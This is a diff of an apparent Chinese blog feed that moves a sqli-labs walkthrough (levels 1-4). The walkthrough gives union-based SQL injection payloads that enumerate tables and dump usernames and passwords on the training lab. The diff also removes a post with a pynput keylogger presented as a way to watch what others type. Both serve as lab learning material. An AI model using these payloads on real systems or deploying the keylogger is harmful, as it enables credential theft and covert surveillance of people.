-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">启动一个默认的docker</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">发现这个默认的tomcat是没有webapps应用，镜像的原因，官方的镜像默认webapps下面是没有文件的</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">我自己从webapps.dist拷贝进webapps了基本文件</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">将我们操作过的容器通过commit提交为一个镜像！我们以后就使用我们修改过的镜像即可</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630460544134-55c5eda4-78b6-4871-b1e4-7954128009ec.png" alt="img"></p>
 ]]></content>
       <categories>
         <category>docker</category>
@@ -2383,6 +2383,142 @@
 ]]></content>
   </entry>
   <entry>
+    <title>sqlilabs 1-4</title>
+    <url>/post/f9788371.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第一关：GET-报错注入-单引号-字符型注入"><a href="#第一关：GET-报错注入-单引号-字符型注入" class="headerlink" title="第一关：GET-报错注入-单引号-字符型注入"></a>第一关：GET-报错注入-单引号-字符型注入</h1><h2 id="1-1-判断闭合方式"><a href="#1-1-判断闭合方式" class="headerlink" title="1.1 判断闭合方式"></a>1.1 判断闭合方式</h2><ul>
+<li><code>id=1\</code>可以知道为单引号闭合</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597090093-e4216f14-8e22-48cd-916a-bbc53312ff76.png" alt="img"></p>
+<ul>
+<li><code>id=1&#39;--+</code>验证成功</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597127009-4fe3820a-9afd-4e1d-adc8-6a52cd50bbc4.png" alt="img"></p>
+<h2 id="1-2-查看有多少列"><a href="#1-2-查看有多少列" class="headerlink" title="1.2 查看有多少列"></a>1.2 查看有多少列</h2><ul>
+<li><code>id=1&#39; order by 3--+</code>用二分法知道有3列</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597243235-6881ab85-c312-4b6d-8372-ece8d4af4a9e.png" alt="img"></p>
+<h2 id="1-3-使用联合报错注入"><a href="#1-3-使用联合报错注入" class="headerlink" title="1.3 使用联合报错注入"></a>1.3 使用联合报错注入</h2><ul>
+<li><code>id=-1&#39; union select 1,2,3--+</code>使前面报错，使用union报错注入，让后面的结果显示出来，发现2和3的位置可以显示出数据来</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597274516-1eb029b2-35a9-4809-9663-f48a29e3d629.png" alt="img"></p>
+<ul>
+<li><code>id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),database()--+</code> 知道当前数据库security有emails、referers、uagents、users表</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597455530-b08c5bd3-cdcf-410f-b83a-ef26dda44454.png" alt="img"></p>
+<ul>
+<li><code>id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),database()--+</code>可以知道users表有id、username、password字段</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597706965-5223f7c9-13b8-43cc-b5b5-e5efc0ee3ab7.png" alt="img"></p>
+<ul>
+<li></li>
+</ul>
+<h1 id="第二关：GET-报错注入-数字型注入"><a href="#第二关：GET-报错注入-数字型注入" class="headerlink" title="第二关：GET-报错注入-数字型注入"></a>第二关：GET-报错注入-数字型注入</h1><h2 id="2-1-判断闭合方式"><a href="#2-1-判断闭合方式" class="headerlink" title="2.1 判断闭合方式"></a>2.1 判断闭合方式</h2><ul>
+<li><code>id=1\</code>发现貌似是数字型注入</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596320700-81aed030-1364-4fa1-9850-fbe211348c0b.png" alt="img"></p>
+<ul>
+<li>id=1 and 1=1正常</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596390957-7192a3c5-4cca-4ac0-8c6d-f8953c770574.png" alt="img"></p>
+<ul>
+<li>id=1 and 1=2失败，可以知道是数字型注入</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596423010-4699c07e-8f44-4535-bd30-fca1c8486064.png" alt="img"></p>
+<h2 id="2-2-查看有多少列"><a href="#2-2-查看有多少列" class="headerlink" title="2.2 查看有多少列"></a>2.2 查看有多少列</h2><ul>
+<li><code>id=1 order by 3</code> 用二分法可以知道只有三列</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596492235-49d223cd-a073-4f1b-9061-6acb0b070e83.png" alt="img"></p>
+<h2 id="2-3-使用联合报错注入"><a href="#2-3-使用联合报错注入" class="headerlink" title="2.3 使用联合报错注入"></a>2.3 使用联合报错注入</h2><ul>
+<li><code>id=1 and 1=2 union select 1,2,3</code>让前面报错，让后面的结果显示，可以发现2和3的位置会显示出来</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596583356-9bdf94f0-e614-4240-a333-ad066f158b2c.png" alt="img"></p>
+<ul>
+<li><code>id=1 and 1=2 union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())</code>可以知道当前数据库为security，由emails、referers、uagents、users表</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596713604-950da20f-9a08-4505-ad9c-393ba48f2d03.png" alt="img"></p>
+<ul>
+<li><code>id=1 and 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)</code>可以知道users表有id、username、password字段</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596815221-c65369f6-14c2-4ffa-b3e3-953f2d1f82ab.png" alt="img"></p>
+<ul>
+<li><code>id=1 and 1=2 union select 1,2,(select group_concat(username,0x3a,password) from users)</code>可以知道用户名和密码</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596957954-ad3651dc-f1b2-4543-820d-d711752b5d9c.png" alt="img"></p>
+<ul>
+<li><code>id=-1&#39; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</code>成功爆出用户名和密码</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597844094-e9350f45-b966-4869-b53b-25f0a7ed5cf8.png" alt="img"></p>
+<h1 id="第三关：GET-报错注入-单引号和括号-字符型注入"><a href="#第三关：GET-报错注入-单引号和括号-字符型注入" class="headerlink" title="第三关：GET-报错注入-单引号和括号-字符型注入"></a>第三关：GET-报错注入-单引号和括号-字符型注入</h1><h2 id="3-1-判断闭合方式"><a href="#3-1-判断闭合方式" class="headerlink" title="3.1 判断闭合方式"></a>3.1 判断闭合方式</h2><ul>
+<li>使用\爆出了错误，可以知道是用(‘xxx’)引起来的</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594183638-70ad1306-cb94-4652-b208-6f06dfbb1066.png" alt="img"></p>
+<ul>
+<li><code>id=1&#39;)--+</code> 验证成功</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594257003-88644ba6-93d1-4e72-a0ce-11c8ed82f2bd.png" alt="img"></p>
+<h2 id="3-2-查看有多少列"><a href="#3-2-查看有多少列" class="headerlink" title="3.2 查看有多少列"></a>3.2 查看有多少列</h2><ul>
+<li><code>id=1&#39;) order by 3 --+</code>经过二分法等可以知道有三列</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594414338-7950d42a-fb9e-4256-b01e-0d5512395b90.png" alt="img"></p>
+<h2 id="3-3-使用联合报错注入"><a href="#3-3-使用联合报错注入" class="headerlink" title="3.3 使用联合报错注入"></a>3.3 使用联合报错注入</h2><ul>
+<li><code>id=-1&#39;) union select 1,2,3--+</code>使用union联合注入，使前面报错，让后面的显示出来，发现2和3的位置会爆出错误信息，接下来就利用这两个位置进行操作</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594517041-6cf8e5c0-19c3-43c8-8a65-cd6f5222061b.png" alt="img"></p>
+<ul>
+<li><code>id=-1&#39;) union select 1,database(),(select table_name from information_schema.tables where table_schema=database() limit 0,1)--+</code></li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594637338-68c917a8-c08c-40ea-a23c-cb22d98e6932.png" alt="img"></p>
+<ul>
+<li>或者直接使用<code>id=-1&#39;) union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</code></li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594692274-294ac53c-9da2-4dbb-b686-605d392d0a0f.png" alt="img"></p>
+<ul>
+<li>可以知道数据库名为security，有emails、referers、uagents、users表</li>
+<li><code>id=-1&#39;) union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)--+</code>可以知道users表有id、username、password字段</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595049262-ab88812b-a39d-4315-88aa-cc51ec795e04.png" alt="img"></p>
+<ul>
+<li><code>id=-1&#39;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code>可以查看到用户名和密码</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595358589-5e5df7aa-5759-428e-a935-6062dcadba3d.png" alt="img"></p>
+<h1 id="第四关：GET-报错注入-双引号和括号-字符型注入"><a href="#第四关：GET-报错注入-双引号和括号-字符型注入" class="headerlink" title="第四关：GET-报错注入-双引号和括号-字符型注入"></a>第四关：GET-报错注入-双引号和括号-字符型注入</h1><h2 id="4-1-判断闭合方式"><a href="#4-1-判断闭合方式" class="headerlink" title="4.1 判断闭合方式"></a>4.1 判断闭合方式</h2><ul>
+<li><code>id=1\</code>可以知道是(“”)闭合</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595788031-a9585c4c-852b-427c-a7a3-45868630c26e.png" alt="img"></p>
+<ul>
+<li><code>id=1&quot;) --+</code>验证成功</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595929772-142667ce-c3b6-43de-914b-9023b06a5771.png" alt="img"></p>
+<h2 id="4-2-查看有多少列"><a href="#4-2-查看有多少列" class="headerlink" title="4.2 查看有多少列"></a>4.2 查看有多少列</h2><ul>
+<li><code>id=1&quot;) order by 3--+</code>由二分法可以知道只有3列</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595974473-5279d731-6b6f-4003-b598-04ec09834b92.png" alt="img"></p>
+<h2 id="4-3-使用联合报错注入"><a href="#4-3-使用联合报错注入" class="headerlink" title="4.3 使用联合报错注入"></a>4.3 使用联合报错注入</h2><ul>
+<li><code>id=-1&quot;) union select 1,2,3--+</code>使用union联合注入，使前面报错，让后面的显示出来，发现2和3的位置会爆出错误信息，接下来就利用这两个位置进行操作</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596020579-14ab5553-585c-4d39-9763-06c74251f984.png" alt="img"></p>
+<ul>
+<li><code>id=-1&quot;) union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</code>可以知道数据库名为security，有emails、referers、uagents、users表</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596063935-002d0a8d-c961-49ae-abe8-3cfab18be436.png" alt="img"></p>
+<ul>
+<li><code>id=-1&quot;) union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)--+</code>可以知道users表有id、username、password字段</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596125977-af57a214-79ff-4688-bcc7-57c0f8c2d4e1.png" alt="img"></p>
+<ul>
+<li><code>id=-1&quot;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code>可以查看到用户名和密码</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596174923-d39479bd-2cb7-4d3d-99b2-ae2200740604.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>方向靶场</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqlilabs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pyautogui模块</title>
     <url>/post/2681d601.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、GUI控制功能"><a href="#一、GUI控制功能" class="headerlink" title="一、GUI控制功能"></a>一、GUI控制功能</h1><ul>
@@ -2550,142 +2686,6 @@
       <tags>
         <tag>Python</tag>
         <tag>爬虫</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqlilabs 1-4</title>
-    <url>/post/f9788371.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第一关：GET-报错注入-单引号-字符型注入"><a href="#第一关：GET-报错注入-单引号-字符型注入" class="headerlink" title="第一关：GET-报错注入-单引号-字符型注入"></a>第一关：GET-报错注入-单引号-字符型注入</h1><h2 id="1-1-判断闭合方式"><a href="#1-1-判断闭合方式" class="headerlink" title="1.1 判断闭合方式"></a>1.1 判断闭合方式</h2><ul>
-<li><code>id=1\</code>可以知道为单引号闭合</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597090093-e4216f14-8e22-48cd-916a-bbc53312ff76.png" alt="img"></p>
-<ul>
-<li><code>id=1&#39;--+</code>验证成功</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597127009-4fe3820a-9afd-4e1d-adc8-6a52cd50bbc4.png" alt="img"></p>
-<h2 id="1-2-查看有多少列"><a href="#1-2-查看有多少列" class="headerlink" title="1.2 查看有多少列"></a>1.2 查看有多少列</h2><ul>
-<li><code>id=1&#39; order by 3--+</code>用二分法知道有3列</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597243235-6881ab85-c312-4b6d-8372-ece8d4af4a9e.png" alt="img"></p>
-<h2 id="1-3-使用联合报错注入"><a href="#1-3-使用联合报错注入" class="headerlink" title="1.3 使用联合报错注入"></a>1.3 使用联合报错注入</h2><ul>
-<li><code>id=-1&#39; union select 1,2,3--+</code>使前面报错，使用union报错注入，让后面的结果显示出来，发现2和3的位置可以显示出数据来</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597274516-1eb029b2-35a9-4809-9663-f48a29e3d629.png" alt="img"></p>
-<ul>
-<li><code>id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),database()--+</code> 知道当前数据库security有emails、referers、uagents、users表</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597455530-b08c5bd3-cdcf-410f-b83a-ef26dda44454.png" alt="img"></p>
-<ul>
-<li><code>id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),database()--+</code>可以知道users表有id、username、password字段</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597706965-5223f7c9-13b8-43cc-b5b5-e5efc0ee3ab7.png" alt="img"></p>
-<ul>
-<li></li>
-</ul>
-<h1 id="第二关：GET-报错注入-数字型注入"><a href="#第二关：GET-报错注入-数字型注入" class="headerlink" title="第二关：GET-报错注入-数字型注入"></a>第二关：GET-报错注入-数字型注入</h1><h2 id="2-1-判断闭合方式"><a href="#2-1-判断闭合方式" class="headerlink" title="2.1 判断闭合方式"></a>2.1 判断闭合方式</h2><ul>
-<li><code>id=1\</code>发现貌似是数字型注入</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596320700-81aed030-1364-4fa1-9850-fbe211348c0b.png" alt="img"></p>
-<ul>
-<li>id=1 and 1=1正常</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596390957-7192a3c5-4cca-4ac0-8c6d-f8953c770574.png" alt="img"></p>
-<ul>
-<li>id=1 and 1=2失败，可以知道是数字型注入</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596423010-4699c07e-8f44-4535-bd30-fca1c8486064.png" alt="img"></p>
-<h2 id="2-2-查看有多少列"><a href="#2-2-查看有多少列" class="headerlink" title="2.2 查看有多少列"></a>2.2 查看有多少列</h2><ul>
-<li><code>id=1 order by 3</code> 用二分法可以知道只有三列</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596492235-49d223cd-a073-4f1b-9061-6acb0b070e83.png" alt="img"></p>
-<h2 id="2-3-使用联合报错注入"><a href="#2-3-使用联合报错注入" class="headerlink" title="2.3 使用联合报错注入"></a>2.3 使用联合报错注入</h2><ul>
-<li><code>id=1 and 1=2 union select 1,2,3</code>让前面报错，让后面的结果显示，可以发现2和3的位置会显示出来</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596583356-9bdf94f0-e614-4240-a333-ad066f158b2c.png" alt="img"></p>
-<ul>
-<li><code>id=1 and 1=2 union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())</code>可以知道当前数据库为security，由emails、referers、uagents、users表</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596713604-950da20f-9a08-4505-ad9c-393ba48f2d03.png" alt="img"></p>
-<ul>
-<li><code>id=1 and 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)</code>可以知道users表有id、username、password字段</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596815221-c65369f6-14c2-4ffa-b3e3-953f2d1f82ab.png" alt="img"></p>
-<ul>
-<li><code>id=1 and 1=2 union select 1,2,(select group_concat(username,0x3a,password) from users)</code>可以知道用户名和密码</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596957954-ad3651dc-f1b2-4543-820d-d711752b5d9c.png" alt="img"></p>
-<ul>
-<li><code>id=-1&#39; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</code>成功爆出用户名和密码</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626597844094-e9350f45-b966-4869-b53b-25f0a7ed5cf8.png" alt="img"></p>
-<h1 id="第三关：GET-报错注入-单引号和括号-字符型注入"><a href="#第三关：GET-报错注入-单引号和括号-字符型注入" class="headerlink" title="第三关：GET-报错注入-单引号和括号-字符型注入"></a>第三关：GET-报错注入-单引号和括号-字符型注入</h1><h2 id="3-1-判断闭合方式"><a href="#3-1-判断闭合方式" class="headerlink" title="3.1 判断闭合方式"></a>3.1 判断闭合方式</h2><ul>
-<li>使用\爆出了错误，可以知道是用(‘xxx’)引起来的</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594183638-70ad1306-cb94-4652-b208-6f06dfbb1066.png" alt="img"></p>
-<ul>
-<li><code>id=1&#39;)--+</code> 验证成功</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594257003-88644ba6-93d1-4e72-a0ce-11c8ed82f2bd.png" alt="img"></p>
-<h2 id="3-2-查看有多少列"><a href="#3-2-查看有多少列" class="headerlink" title="3.2 查看有多少列"></a>3.2 查看有多少列</h2><ul>
-<li><code>id=1&#39;) order by 3 --+</code>经过二分法等可以知道有三列</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594414338-7950d42a-fb9e-4256-b01e-0d5512395b90.png" alt="img"></p>
-<h2 id="3-3-使用联合报错注入"><a href="#3-3-使用联合报错注入" class="headerlink" title="3.3 使用联合报错注入"></a>3.3 使用联合报错注入</h2><ul>
-<li><code>id=-1&#39;) union select 1,2,3--+</code>使用union联合注入，使前面报错，让后面的显示出来，发现2和3的位置会爆出错误信息，接下来就利用这两个位置进行操作</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594517041-6cf8e5c0-19c3-43c8-8a65-cd6f5222061b.png" alt="img"></p>
-<ul>
-<li><code>id=-1&#39;) union select 1,database(),(select table_name from information_schema.tables where table_schema=database() limit 0,1)--+</code></li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594637338-68c917a8-c08c-40ea-a23c-cb22d98e6932.png" alt="img"></p>
-<ul>
-<li>或者直接使用<code>id=-1&#39;) union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</code></li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626594692274-294ac53c-9da2-4dbb-b686-605d392d0a0f.png" alt="img"></p>
-<ul>
-<li>可以知道数据库名为security，有emails、referers、uagents、users表</li>
-<li><code>id=-1&#39;) union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)--+</code>可以知道users表有id、username、password字段</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595049262-ab88812b-a39d-4315-88aa-cc51ec795e04.png" alt="img"></p>
-<ul>
-<li><code>id=-1&#39;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code>可以查看到用户名和密码</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595358589-5e5df7aa-5759-428e-a935-6062dcadba3d.png" alt="img"></p>
-<h1 id="第四关：GET-报错注入-双引号和括号-字符型注入"><a href="#第四关：GET-报错注入-双引号和括号-字符型注入" class="headerlink" title="第四关：GET-报错注入-双引号和括号-字符型注入"></a>第四关：GET-报错注入-双引号和括号-字符型注入</h1><h2 id="4-1-判断闭合方式"><a href="#4-1-判断闭合方式" class="headerlink" title="4.1 判断闭合方式"></a>4.1 判断闭合方式</h2><ul>
-<li><code>id=1\</code>可以知道是(“”)闭合</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595788031-a9585c4c-852b-427c-a7a3-45868630c26e.png" alt="img"></p>
-<ul>
-<li><code>id=1&quot;) --+</code>验证成功</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595929772-142667ce-c3b6-43de-914b-9023b06a5771.png" alt="img"></p>
-<h2 id="4-2-查看有多少列"><a href="#4-2-查看有多少列" class="headerlink" title="4.2 查看有多少列"></a>4.2 查看有多少列</h2><ul>
-<li><code>id=1&quot;) order by 3--+</code>由二分法可以知道只有3列</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626595974473-5279d731-6b6f-4003-b598-04ec09834b92.png" alt="img"></p>
-<h2 id="4-3-使用联合报错注入"><a href="#4-3-使用联合报错注入" class="headerlink" title="4.3 使用联合报错注入"></a>4.3 使用联合报错注入</h2><ul>
-<li><code>id=-1&quot;) union select 1,2,3--+</code>使用union联合注入，使前面报错，让后面的显示出来，发现2和3的位置会爆出错误信息，接下来就利用这两个位置进行操作</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596020579-14ab5553-585c-4d39-9763-06c74251f984.png" alt="img"></p>
-<ul>
-<li><code>id=-1&quot;) union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</code>可以知道数据库名为security，有emails、referers、uagents、users表</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596063935-002d0a8d-c961-49ae-abe8-3cfab18be436.png" alt="img"></p>
-<ul>
-<li><code>id=-1&quot;) union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)--+</code>可以知道users表有id、username、password字段</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596125977-af57a214-79ff-4688-bcc7-57c0f8c2d4e1.png" alt="img"></p>
-<ul>
-<li><code>id=-1&quot;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code>可以查看到用户名和密码</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626596174923-d39479bd-2cb7-4d3d-99b2-ae2200740604.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>方向靶场</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqlilabs</tag>
       </tags>
   </entry>
   <entry>
@@ -2876,47 +2876,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>想要监控键盘？Python搞定！</title>
-    <url>/post/90a9d002.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>如果将电脑暂时给他人用，如何监控别人在我们电脑使用键盘敲了些什么东西呢？</p>
-<p>软件下载地址：<a href="https://github.com/w01ke/Keyboard_Record">https://github.com/w01ke/Keyboard_Record</a> ，下载完成后双击w01ke.exe即可运行</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220101190041070.png" alt="image-20220101190041070"></p>
-<h1 id="一、环境依赖"><a href="#一、环境依赖" class="headerlink" title="一、环境依赖"></a>一、环境依赖</h1><p>需要安装pynput模块，可以使用pip安装</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pynput</span><br></pre></td></tr></table></figure>
-
-<p>也可以在pycharm的<strong>settings&gt;interpreter中安装</strong></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641019883218-4ab81692-8192-45dd-883e-3cddad557704.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641019901019-1d8dd10c-1e69-4afe-9e8b-72e0819ee081.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641019919002-aeefc97f-e784-4cfa-b46b-4b0c1cc2fd5b.png" alt="img"></p>
-<h1 id="二、相关代码"><a href="#二、相关代码" class="headerlink" title="二、相关代码"></a>二、相关代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pynput.keyboard <span class="keyword">import</span> Key, Controller, Listener</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">keyboard = Controller()</span><br><span class="line">keys = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_press</span>(<span class="params">key</span>):</span></span><br><span class="line">    <span class="built_in">str</span>(key).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_release</span>(<span class="params">key</span>):</span></span><br><span class="line">    <span class="keyword">global</span> keys</span><br><span class="line">    string = <span class="built_in">str</span>(key).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    keys.append(<span class="string">&#x27;\r&#x27;</span> + string)</span><br><span class="line">    <span class="built_in">print</span>(keys)</span><br><span class="line">    main_string = <span class="string">&quot;&quot;</span>.join(keys)</span><br><span class="line">    <span class="built_in">print</span>(main_string)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(main_string) &gt; <span class="number">15</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:/w01ke.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(main_string)</span><br><span class="line">            keys = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> Listener(on_press=on_press, on_release=on_release) <span class="keyword">as</span> listener:</span><br><span class="line">    listener.join()</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>这里会将键盘记录传入<strong>D:/w01ke.txt</strong></li>
-</ul>
